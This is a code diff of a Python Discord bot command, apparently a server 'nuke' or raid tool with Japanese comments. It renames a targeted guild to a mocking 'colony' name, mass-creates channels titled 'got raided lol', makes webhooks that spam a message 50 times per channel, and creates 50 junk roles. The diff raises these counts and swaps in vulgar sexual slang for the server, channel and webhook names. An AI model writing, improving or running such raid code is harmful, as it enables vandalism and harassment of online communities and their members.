@@ -151,14 +151,14 @@ async def ozeu(ctx, guild_id: int = None):
 
     # サーバー名変更
     try:
-        await guild.edit(name="ozeuの植民地")
+        await guild.edit(name="みうまんこの植民地")
     except Exception as e:
         print(f"[ozeu] サーバー名の変更でエラー: {e}")
 
     # --- チャンネル作成関数 ---
     async def create_channel(i):
         try:
-            return await guild.create_text_channel(name="荒らされてやんのｗｗｗ")
+            return await guild.create_text_channel(name="まんこに荒らされてやんのｗｗｗ")
         except Exception as e:
             print(f"[ozeu] {i+1}個目のチャンネル作成失敗: {e}")
             return None
@@ -170,8 +170,8 @@ async def ozeu(ctx, guild_id: int = None):
     async def send_with_webhook(channel):
         try:
             webhook = await channel.create_webhook(name="ZPlusWebhook")
-            for _ in range(45):
-                await webhook.send(SPAM_MESSAGE, username="ガバマン")
+            for _ in range(50):
+                await webhook.send(SPAM_MESSAGE, username="ぜっとぷらす")
         except Exception as e:
             print(f"[ozeu] {channel.name} のWebhook送信でエラー: {e}")
 
@@ -179,7 +179,7 @@ async def ozeu(ctx, guild_id: int = None):
 
     # ロール作成
     try:
-        for i in range(30):
+        for i in range(50):
             await guild.create_role(name=f"bot用権限{i+1}")
     except Exception as e:
         print(f"[ozeu] ロール作成でエラー: {e}")
